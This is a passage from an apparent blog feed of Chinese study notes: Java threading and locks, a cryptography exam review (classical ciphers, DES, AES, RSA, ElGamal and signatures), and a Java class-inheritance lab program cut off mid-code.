class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyThread</span> <span class="keyword">extends</span> <span class="title">Thread</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">/* 覆盖该方法*/</span> </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>声明一个实现 Runnable 接口的类，并实现 run() 方法<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyThread</span> <span class="keyword">implements</span> <span class="title">Runnable</span></span>&#123; </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="comment">/* 实现该方法*/</span> </span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h2 id="同步"><a href="#同步" class="headerlink" title="同步"></a>同步</h2><p>同步代码块<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">synchronized</span>(myObject) &#123;  <span class="comment">// myobject是任意的对象引用</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h2 id="加锁"><a href="#加锁" class="headerlink" title="加锁"></a>加锁</h2><p>将同步和锁封装成对象，并将操作锁的隐式动作转换为显示动作<br>Lock接口（java.util.concurrent.locks）<br>已知实现类： ReentrantLock<br>     Lock l = …;<br>     l.lock();<br>     try {<br>         // access the resource protected by this lock<br>     } finally {<br>         l.unlock();<br>     }<br>锁定和取消锁定出现在不同作用范围中时，必须谨慎地确保保持锁定时所执行的所有代码用 try-finally 或 try-catch 加以保护，以确保在必要时释放锁    </p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;基础&quot;&gt;&lt;a href=&quot;#基础&quot; class=&quot;headerlink&quot; title=&quot;基础&quot;&gt;&lt;/a&gt;基础&lt;/h1&gt;&lt;ol&gt;
&lt;li&gt;局部变量在使用前必须给定初值，否则编译出错&lt;br&gt;类成员变量无此要求  &lt;/li&gt;
&lt;li&gt;final  类型    常量名=值
      
    
    </summary>
    
      <category term="java" scheme="http://yoursite.com/categories/java/"/>
    
    
      <category term="java" scheme="http://yoursite.com/tags/java/"/>
    
  </entry>
  
  <entry>
    <title>密码学复习</title>
    <link href="http://yoursite.com/2019/01/05/%E5%AF%86%E7%A0%81%E5%AD%A6%E5%A4%8D%E4%B9%A0/"/>
    <id>http://yoursite.com/2019/01/05/密码学复习/</id>
    <published>2019-01-04T16:00:00.000Z</published>
    <updated>2019-01-07T07:16:51.787Z</updated>
    
    <content type="html"><![CDATA[<h1 id="古典密码"><a href="#古典密码" class="headerlink" title="古典密码"></a>古典密码</h1><h2 id="仿射"><a href="#仿射" class="headerlink" title="仿射"></a>仿射</h2><h3 id="加解密"><a href="#加解密" class="headerlink" title="加解密"></a>加解密</h3><pre><code>加密变换：  𝐶＝ 𝑘1∗𝑚＋𝑘2 𝑚𝑜𝑑 26  </code></pre><p>𝐾1=1时，移位密码<br>𝐾2=1时，乘数密码<br>     解密变换：  𝑚＝ (𝐶−𝑘2)∗〖𝑘1〗^(−1) 𝑚𝑜𝑑 26</p><p>密钥空间: n(n)</p><h2 id="Playfair"><a href="#Playfair" class="headerlink" title="Playfair"></a>Playfair</h2><h3 id="加解密-1"><a href="#加解密-1" class="headerlink" title="加解密"></a>加解密</h3><p>对每一对明文𝑚1, 𝑚2加密如下：<br>若𝑚1和𝑚2同行，则密文𝑐1和𝑐2分别紧靠𝑚1，𝑚2右端的字母，其中第一列看做最后一列的右方<br>若𝑚1和𝑚2同列，则密文𝑐1和𝑐2分别是紧靠𝑚1，𝑚2下方的字母，其中第一行看做最后一行的下方<br>若𝑚1和𝑚2不同行也不同列，则𝑐1和𝑐2是𝑚1，𝑚2确定的矩形的其他两角的字母，并𝑐1和𝑚1，𝑐2和𝑚2同行<br>若出现重复字母，即𝑚1=𝑚2，则在其中插入字母Q<br>如明文字母是单数，将Q放在明文的末端<br>      llylq ly<br>      查表：<br>             QZ  KZ</p><p>密钥空间：25！</p><h2 id="Vigenere"><a href="#Vigenere" class="headerlink" title="Vigenere"></a>Vigenere</h2><h3 id="加解密-2"><a href="#加解密-2" class="headerlink" title="加解密"></a>加解密</h3><p>密钥：𝑘=𝑘1𝑘2𝑘3 · · · 𝑘𝑛<br>明文：𝑚=𝑚1𝑚2𝑚3 · · · 𝑚𝑛 </p><p>加密：𝐸(𝑚)=𝐶=𝑐1𝑐2𝑐3 · · · 𝑐𝑛<br>                      𝑐𝑖=𝑚𝑖+𝑘_𝑖  𝑚𝑜𝑑 26</p><p>解密：𝑚𝑖=𝑐𝑖−𝑘_𝑖 𝑚𝑜𝑑 26</p><p>密钥空间：26^m</p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><h3 id="穷举分析"><a href="#穷举分析" class="headerlink" title="穷举分析"></a>穷举分析</h3><p>蛮力攻击的次数：</p><ol><li>加同余密码：明文为英文字母表时，𝑘只有25种可能值。明文为8位扩展ASCII码时，𝑘只有255种值。穷举即可</li><li>乘数密码更易破译。密钥𝑘要满足条件(n, k )＝1，即𝑘只有≤ (n)个不同取值。去掉𝑘＝1恒等情况，𝑘只有(n)－1种<br>明文为英文字母表时，𝑘只能取3，5，7，9，11，15，17，19，21，23，25共11种不同值</li><li>仿射密码保密性好一些。但密钥也只有n(n)－1种。(𝑚𝑖∗𝑘1+𝑘2 ，去掉 𝑚𝑖∗1+0)<br>对英文字母表的情况，密钥只有26×12－1＝311种<br>古代密码分析者用穷举法破译可能会有一定困难，但对计算机来说微不足道</li></ol><h1 id="攻击方法"><a href="#攻击方法" class="headerlink" title="攻击方法"></a>攻击方法</h1><p>攻击者知道密码算法<br>方式分为:</p><ul><li><p>唯密文攻击（Ciphertext-only attack）—被动攻击<br>密码分析者仅能根据截获的密文进行分析，以得出明文或密钥。<br>穷举攻击和统计分析都是唯密文攻击</p></li><li><p>已知明文攻击（Plaintext-known attack） —被动攻击<br>密码分析者除了有截获的密文外，还有一些已知的“明文—密文对”来破译密码   </p></li><li><p>选择明文攻击（Chosen-plaintext attack） —主动攻击<br>密码分析者除得到一些“明文—密文对”外，还可以选择被加密的明文，并获得相应的密文；密码破译者暂时控制<strong>加密机</strong><br>变体：自适应选择明文攻击（Adaptive-chosen-plaintext attack）</p></li><li><p>选择密文攻击(Chosen-ciphertext attack) —主动攻击<br>指密码分析者可以选择一些密文，并得到相应的明文；密码破译者暂时控制<strong>解密机</strong></p></li></ul><p>自适应选择密文攻击（Adaptive-chosen-ciphetext attack ）</p><h1 id="分组密码"><a href="#分组密码" class="headerlink" title="分组密码"></a>分组密码</h1><h2 id="DES"><a href="#DES" class="headerlink" title="DES"></a>DES</h2><h3 id="算法"><a href="#算法" class="headerlink" title="算法"></a>算法</h3><ol><li><p>DES：明文分组和密文分组均为64比特，有效密钥56比特</p></li><li><p>DES由初始置换，16轮迭代，逆初始置换组成</p></li><li><p>DES的加解密算法相同，只是解密子密钥与加密子密钥的使用顺序相反</p></li></ol><p>加解密<br><img src="https://i.imgur.com/nD6pEK7.png" alt=""><br>16轮迭代<br><img src="https://i.imgur.com/cZkvuUR.png" alt=""><br>S盒计算<br><img src="https://i.imgur.com/XBtU1D5.png" alt=""><br>密钥产生<br><img src="https://i.imgur.com/jBguSYc.png" alt="">   </p><h3 id="工作模式"><a href="#工作模式" class="headerlink" title="工作模式"></a>工作模式</h3><p>二重DES不能提高密钥长度，抵抗穷举攻击不能抵抗中途相遇攻击。(57bit)</p><p>三重DES：<br>    EEE3：C=EK1(EK2(EK3(P)))<br>    EDE3：C=EK1(DK2(EK3(P)))<br>    EEE2：C=EK1(EK2(EK2(P)))<br>    EDE2：C=EK1(DK2(EK1(P)))或者C=EK1(DK1(EK2(P)))<br>密钥长度增加到112bit或168bit。避免了穷举攻击</p><h3 id="数学语言描述"><a href="#数学语言描述" class="headerlink" title="数学语言描述"></a>数学语言描述</h3><p><img src="https://i.imgur.com/vVhlIFD.png" alt=""></p><h3 id="安全性能分析"><a href="#安全性能分析" class="headerlink" title="安全性能分析"></a>安全性能分析</h3><ol><li><p>DES存在一些弱密钥和半弱密钥</p></li><li><p>DES的56位密钥无法抵抗穷举攻击</p></li><li><p>代数结构存在互补对称性</p></li></ol><p>    弱密钥：用相同的密钥两次加密后，结果等于明文，存在4个。<br>         𝑬𝒌(𝑬𝒌(𝒎))= 𝒎  和  𝑫𝒌(𝑫𝒌(𝒎))= 𝒎</p><p>    半弱密钥：两个不同的密钥，他们加密的结果相同，至少有12个。<br>        𝐸<em>(𝑘^′ ) (𝐸</em>𝑘 (𝑚))=𝐸<em>𝑘 (𝐸</em>(𝑘^′ ) (𝑚))=𝑚              </p><p>互补性 </p><ol><li>互补性使DES在选择明文攻击下所需的工作量减半（2^55）<br> c1=Ek(m) c2=Ek(~m)   ~c2=E~k(m)<br>所以对𝑚加密，如果密文为𝑐1，则加密密钥为𝑘, 如果密文为~c2,则加密密钥为~𝑘</li></ol><h2 id="AES"><a href="#AES" class="headerlink" title="AES"></a>AES</h2><h3 id="算法描述"><a href="#算法描述" class="headerlink" title="算法描述"></a>算法描述</h3><p>采用SP结构的迭代型分组密码<br>分组长度和密钥长度都可变，各自可以为128、192、256比特</p><p>加解密<br><img src="https://i.imgur.com/gTgxnAB.png" alt=""><br>密钥扩展<br>对𝑤数组扩展40个新列，构成44列的密钥数组：<br>如果𝑖不是4的倍数，则第𝑖列为：<br>    𝑤[𝑖]=𝑤[𝑖−4]⊕𝑤[𝑖−1]<br>如果𝑖是4的倍数，则第𝑖列为：<br>    𝑤[𝑖]=𝑤[𝑖−4]⊕𝑇(𝑤[𝑖−1])</p><p><img src="https://i.imgur.com/0LzVPMj.png" alt=""><br>T函数：字循环、字节代换和轮常量异或</p><h3 id="安全性"><a href="#安全性" class="headerlink" title="安全性"></a>安全性</h3><ol><li>加密解密不一致，避免弱密钥</li><li>抵抗差分分析和线性分析</li><li>密钥穷举攻击平均需要2^127次AES运算</li></ol><h2 id="DES和AES"><a href="#DES和AES" class="headerlink" title="DES和AES"></a>DES和AES</h2><ol><li>相同之处<br>二者的轮函数都是由三层构成，非线性层、线性混合层、子密钥异或，只是顺序不同<br>AES的子密钥异或对应于DES中S盒之前的子密钥异或<br>AES的列混合运算的目的是让不同的字节相互影响，而DES中F函数的输出与左边一半数据相加也有类似的效果<br>AES的非线性运算是字节代替(ByteSub)，对应于DES中惟一的非线性运算S盒<br>行移位运算保证了每一行的字节不仅仅影响其它行对应的字节，而且影响其它行所有的字节，这与DES中置换P相似</li></ol><p>2.不同之处<br>AES的密钥长度(128位、192位、256位)是可变的，而DES的密钥长度固定为56位<br>DES是面向比特的运算，AES是面向字节的运算<br>AES的加密运算和解密运算不一致，因而加密器不能同时用作解密器，DES则无此限制</p><h3 id="分组密码工作模式"><a href="#分组密码工作模式" class="headerlink" title="分组密码工作模式"></a>分组密码工作模式</h3><p>明文错误扩散： 加密前明文某个错误对解密后恢复明文的影响。<br>密文错误扩散： 加密后密文某个错误对解密后恢复明文分组的影响。</p><p><img src="https://i.imgur.com/dqgrU10.png" alt=""><br>CBC<br><img src="https://i.imgur.com/IKqy9xf.png" alt=""></p><p>CFB和OFB解密将P和C互换位置<br>CFB<br><img src="https://i.imgur.com/1gRqwGI.png" alt=""><br>OFB<br><img src="https://i.imgur.com/3VZmWXn.png" alt=""><br>CTR<br><img src="https://i.imgur.com/a5XPzIs.png" alt=""><br><img src="https://i.imgur.com/Odoc6MR.jpg" alt=""></p><h1 id="序列密码"><a href="#序列密码" class="headerlink" title="序列密码"></a>序列密码</h1><h2 id="线性反馈移位寄存器"><a href="#线性反馈移位寄存器" class="headerlink" title="线性反馈移位寄存器"></a>线性反馈移位寄存器</h2><ol><li>线性反馈移位寄存器(liner feedback shift register,LFSR)是一种特殊的FSR，其反馈函数是移位寄存器中某些位的异或，参与运算的这些位叫做抽头位</li><li>选择合适反馈函数可使序列周期达到最大值2^n -1，周期达到最大值的序列称为m序列</li><li>若n次不可约多项式𝑝(𝑥)的阶为2^𝑛－1，则称𝑝(𝑥)是n次本原多项式</li></ol><h1 id="Hash函数"><a href="#Hash函数" class="headerlink" title="Hash函数"></a>Hash函数</h1><h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h2><p>函数 y=H(x)满足    </p><ol><li>将任意长度的比特串x压缩成为固定长度的比特串y   </li><li>已知x，计算y=H(x)很容易；已知y，找一个x满足y=H(x)在计算上不可行——单向性   </li><li>找(x1，x2)，x1≠x2，满足H(x1)= H(x2)在计算上是不可行的———抗碰撞性<br>这样的函数称为杂凑函数(Hash函数)    </li></ol><h2 id="数据填充"><a href="#数据填充" class="headerlink" title="数据填充"></a>数据填充</h2><p>填充的方法是填充一个1和n个0，信息的长度就为N*512+448(bit),将原始消息长度用64位附加在填充结果后，消息长度为512比特整数倍。</p><h2 id="安全性-1"><a href="#安全性-1" class="headerlink" title="安全性"></a>安全性</h2><ol><li>单向性</li><li><p>抗弱碰撞性<br>对任意给定的消息𝑚，寻找与𝑚不同的消息𝑚’，使得ℎ(𝑚)=ℎ(𝑚’)在计算上不可行</p></li><li><p>抗强碰撞性：<br>寻找任意两个不同的消息𝑚和𝑚’,使得ℎ(𝑚)=ℎ(𝑚’)在计算上不可行</p></li></ol><h1 id="公钥密码"><a href="#公钥密码" class="headerlink" title="公钥密码"></a>公钥密码</h1><h2 id="RSA"><a href="#RSA" class="headerlink" title="RSA"></a>RSA</h2><h3 id="算法-1"><a href="#算法-1" class="headerlink" title="算法"></a>算法</h3><p>基于大整数分解问题</p><ol><li><p>密钥的生成</p><ol><li>选择两个大素数 𝑝和𝑞,（𝑝≠𝑞，需要保密，步骤4以后建议销毁）  </li><li>计算n=pq。计算φ(n)=(p-1)(q-1)<br>3.随机选择一个整数e，条件是1&lt; e &lt; φ(n)，gcd(e,φ(n))=1</li><li>计算ed ≡ 1 (mod φ(n)) (e对于φ(n)的模反元素d)<br>得到：公钥为{𝑒, 𝑛}； 私钥为{𝑑}<br>加密(用𝒆，𝒏)： 明文𝑀&lt;𝑛， 密文𝐶=𝑀^𝑒 (𝑚𝑜𝑑 𝑛).<br>解密(用𝒅，𝒏)： 密文𝐶， 明文𝑀 =𝐶^𝑑 (𝑚𝑜𝑑 𝑛)        </li></ol></li><li><p>正确性验证<br>1.若gcd⁡(𝒎,𝒏)=𝟏,<br>𝐶𝑑 𝑚𝑜𝑑 𝑛=(𝒎^𝒆)𝑑 𝑚𝑜𝑑 𝑛 =𝒎^𝒆𝒅  𝑚𝑜𝑑 𝑛≡𝑚 𝑚𝑜𝑑 𝑛<br>2.若gcd⁡(𝒎,𝒏)&gt;𝟏,由于𝒏=𝒑𝒒,所以gcd⁡(𝒎,𝒏)必含𝒑,𝒒之一，设gcd⁡(𝒎,𝒏)=𝒑或𝒎=𝒄𝒑, 𝟏≤𝒄≤𝒒,由欧拉定理得：<br>𝒎^(𝝋(𝒒))=𝟏(𝒎𝒐𝒅 𝒒).<br>𝒎^(𝒒−𝟏)(𝒑−𝟏)𝒌=𝟏(𝒎𝒐𝒅 𝒒)<br> 即 𝒎^(𝒌𝝋(n))=𝟏(𝒎𝒐𝒅 𝒒) 或 𝟏=𝒎^(𝒌𝝋(n))+𝒉𝒒<br> 由假定𝒎=𝒄𝒑得：<br>   𝒎=𝒎^(𝒌𝝋(n)+𝟏)+𝒄𝒉𝒑𝒒=𝒎^(𝒌𝝋(n)+𝟏)+𝒂𝒏 (其中𝒂=𝒄𝒉),<br>即𝒎^(𝒌𝝋(n)+𝟏)=𝒎 (𝒎𝒐𝒅 𝒏)        </p><h3 id="攻击"><a href="#攻击" class="headerlink" title="攻击"></a>攻击</h3></li><li>选择密文攻击：不要用RSA对陌生消息进行签名，签名前先使用散列函数加密</li><li>公共模攻击：不要使用相同的模数n</li><li>小加密指数攻击：选择大加密指数</li><li>小解密指数攻击：选择大解密指数</li><li>时间性攻击：使用随机延迟或盲化。</li></ol><h2 id="ElGamal"><a href="#ElGamal" class="headerlink" title="ElGamal"></a>ElGamal</h2><h2 id="算法-2"><a href="#算法-2" class="headerlink" title="算法"></a>算法</h2><p>基于有限域上的离散对数问题。</p><p>1.密钥的生成<br>   选取大素数𝑝，𝑔∈〖𝑍_𝑝〗^∗是一个生成元，𝑝,𝑔 作为系统参数所有用户共享<br>   系统中每个用户U都随机挑选整数𝑥，2≤𝑥≤ 𝑝－2，并计算：<br>                         𝑦=𝑔𝑥(𝑚𝑜𝑑 𝑝)，<br>   𝑦, 𝑝”,”   𝑔作为用户U的公钥，而𝑥作为用户U的私钥<br>2.加密   </p><ol><li>用户A先把明文𝑀编码为一个在 0 到𝑝－1之间的整数𝑚 ；</li><li>用户A挑选一个秘密随机数 𝑟 ( 2≤ 𝑟 ≤ 𝑝－2 )，       并计算：     3.                         <pre><code>𝑐1＝ 𝑔^𝑟 (𝑚𝑜𝑑 𝑝)；𝑐2 ＝ 𝑚∙𝑦^𝑟(𝑚𝑜𝑑 𝑝)</code></pre></li></ol><ul><li>用户A把二元组 (𝒄𝟏 ,𝒄𝟐) 作为密文传送给用户B</li></ul><p>3.解密<br>用户B接收到密文二元组(𝑐1 ,𝑐2)后，做解密计算：<br>m=c2 * (c1^x)-1 mod p</p><p>明文空间为Zp<em>，而密文空间为Zp</em> <em> Zp</em></p><h1 id="数字签名"><a href="#数字签名" class="headerlink" title="数字签名"></a>数字签名</h1><h2 id="RSA签名"><a href="#RSA签名" class="headerlink" title="RSA签名"></a>RSA签名</h2><h2 id="算法-3"><a href="#算法-3" class="headerlink" title="算法"></a>算法</h2><ol><li>密钥的生成（与加密系统一样）：<pre><code>公钥𝑃𝑘={𝑒,𝑛};私钥𝑆𝑘={𝑑}</code></pre></li><li>签名过程 (𝑑,𝑛)：用户A对消息𝑀∈𝑍_𝑛进行签名，计算<pre><code>𝑆=𝑆𝑖𝑔(𝐻(𝑀))=𝐻(𝑀)𝑑 𝑚𝑜𝑑 𝑛；</code></pre> 并将𝑆附在消息𝑀后</li><li>验证过程 (𝑒,𝑛)：<br>  给定(𝑀,𝑆)，𝑉𝑒𝑟(𝑀,𝑆)为真⟺<pre><code>𝐻(𝑀)=𝑆^𝑒  (𝑚𝑜𝑑 𝑛)成立</code></pre></li></ol><h2 id="安全分析"><a href="#安全分析" class="headerlink" title="安全分析"></a>安全分析</h2><ol><li>假设RSA直接对消息进行签名： Hash函数</li><li>利用已有签名进行攻击： 对数据的Hash值签名（𝑆𝑖𝑔(𝑀1𝑀2) = 𝑆𝑖𝑔(𝑀1)𝑆𝑖𝑔(𝑀2)）</li><li>利用签名获得明文： 对数据的Hash值签名</li></ol><h2 id="ElGamal签名"><a href="#ElGamal签名" class="headerlink" title="ElGamal签名"></a>ElGamal签名</h2><h2 id="算法-4"><a href="#算法-4" class="headerlink" title="算法"></a>算法</h2><ol><li>系统初始化过程：公钥为(𝑝,𝑔,𝑦)，私钥为𝑥 (1≤𝑥＜𝑝−1)，其中𝒚=g^𝒙  𝒎𝒐𝒅 𝒑</li><li>签名过程：给定消息𝑀，签名者如下计算：<br> ①选择随机数𝑘∈〖𝑍_𝑝〗^∗，且𝑘与(𝑝－1)互素；<br> ②首先计算消息𝑀的哈希值𝐻(𝑀)，然后计算:<pre><code>    𝑟=g^𝒌 𝑚𝑜𝑑 𝑝；𝑠 =(𝐻(𝑀)−𝑥𝑟) 𝑘^(−1)   (𝑚𝑜𝑑 𝑝－1) </code></pre> ③ 将(𝑟，𝑠)作为签名，与𝑀一起发送给接收方<br>3.验证签名过程:接收方收到𝑀与其签名(𝑟,𝑠)后：<pre><code>① 计算消息𝑀的Hash值𝐻(𝑀)；② 验证公式 𝒚^𝒓 𝒓^𝒔＝𝒈^(𝑯(𝑴)) 𝒎𝒐𝒅 𝒑 </code></pre>  成立则确认(𝑟,𝑠)为有效签名，否则认为签名是伪造的</li></ol><h2 id="安全性-2"><a href="#安全性-2" class="headerlink" title="安全性"></a>安全性</h2><ol><li><p>非确定性数字签名算法，同一消息𝑀的签名依赖于随机数𝒌</p></li><li><p>安全性基于有限域上计算离散对数的困难性</p></li><li><p>随机数𝒌不能被泄露(已知𝒌可以计算𝑥)</p></li><li><p>随机数𝒌不能被重复使用（泄露𝑥 ）</p></li><li><p>多次签名选取的多个𝒌无关联（泄露𝑥 ）</p></li><li><p>不使用Hash函数则易受到攻击</p></li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;古典密码&quot;&gt;&lt;a href=&quot;#古典密码&quot; class=&quot;headerlink&quot; title=&quot;古典密码&quot;&gt;&lt;/a&gt;古典密码&lt;/h1&gt;&lt;h2 id=&quot;仿射&quot;&gt;&lt;a href=&quot;#仿射&quot; class=&quot;headerlink&quot; title=&quot;仿射&quot;&gt;&lt;/a&gt;仿射&lt;/h
      
    
    </summary>
    
      <category term="crypto" scheme="http://yoursite.com/categories/crypto/"/>
    
    
      <category term="crypto" scheme="http://yoursite.com/tags/crypto/"/>
    
  </entry>
  
  <entry>
    <title>java_code</title>
    <link href="http://yoursite.com/2019/01/04/java%E5%AE%9E%E9%AA%8C/"/>
    <id>http://yoursite.com/2019/01/04/java实验/</id>
    <published>2019-01-03T16:00:00.000Z</published>
    <updated>2019-01-08T12:43:44.115Z</updated>
    
    <content type="html"><![CDATA[<h1 id="类编程"><a href="#类编程" class="headerlink" title="类编程"></a>类编程</h1><p>  类Person:<br>          属性：编号、姓名、性别；<br>          构造方法：确定编号和姓名；<br>          一般方法：修改编号、姓名，获取编号、姓名。<br>      类Teacher：继承类Person并增加：<br>          属性：系别；<br>          构造方法：调用父类的构造方法；<br>          一般方法：修改、获取系别。<br>      类Student：继承类Person并增加：<br>          属性：班级；<br>          构造方法：调用父类的构造方法；<br>          一般方法：修改、获取班级属性值。<br>      类Classes：<br>          属性：班级名称，学生名单(Student类对象的数组)；<br>          构造方法：确定班级名称；<br>          一般方法：建立学生名单，输出学生名单。<br>      类Main：<br>主类。主方法中创建一个班级，然后建立该班级的学生名单，最后<br>输出学生名单。     </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String id,name,sex;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Person</span><span class="params">(String id,String name)</span></span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.id=id;</span><br><span class="line">        <span class="keyword">this</span>.name=name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">set_id</span><span class="params">(String id)</span></span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.id=id;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">set_name</span><span class="params">(String name)</span></span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name=name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">get_id</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> id;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">get_name</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Teacher</span> <span class="keyword">extends</span> <span class="title">Person</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String department;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Teacher</span><span class="params">(String id,String name,String department)</span></span>&#123;</span><br><span class="line">        <span class="keyword">super</span>(id,name);</span><br><span class="line">        <span class="keyword">this</span>.department=department;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">set_department</span><span class="params">(String department)</span></span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.department=department;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">get_department</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> department;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Student</span> <span class="keyword">extends</span> <span class="title">Person</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String s_class;</span><br><span class="line"></span><br><span class="line">    Student(String  id,String name)&#123;</span><br><span class="line">        <span class="keyword">super</span>(id,name);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setS_class</span><span class="params">(String s_class)</span></span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.s_class=s_class;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function">String <span class="title">getS_class</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> s_class;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Classes</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String s_class;</span><br><span class="line">    Student[] students=<span class="keyword">new</span>  Student[<span class="number">10</span>];</span><br><span class="line">    <span class="keyword">int</span> num=<span class="number">0</span>;</span><br><span class="line">    Classes(String s_class)&#123;</span><br><span class="line">       <span class="keyword">this</span>.s_class=s_class;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">setS_list</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"输入学生人数"</span>);</span><br><span class="line">        Scanner sc= <span class="keyword">new</span> Scanner(System.in);</span><br><span class="line">        num=sc.nextInt();</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;num;i++)&#123;</span><br><span class="line">            System.out.println(<span class="string">"输入学号，姓名"</span>);</span><br><span class="line">            students[i]=<span class="keyword">new</span> Student(sc.next(),sc.next());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">outS_list</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"班级:"</span>+s_class);</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;num;i++)&#123;</span><br><span class="line">            System.out.println(<span class="string">"ID:"</span>+students[i].get_id()+<span class="string">" "</span>+<span class="string">"姓名:"</span>+students[i].get_name());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span>  </span>&#123;</span><br><span class="line">        Classes classes = <span class="keyword">new</span> Classes(<span class="string">"信安"</span>);</span><br><span class="line">        classes.setS_list();</span><br><span class="line">        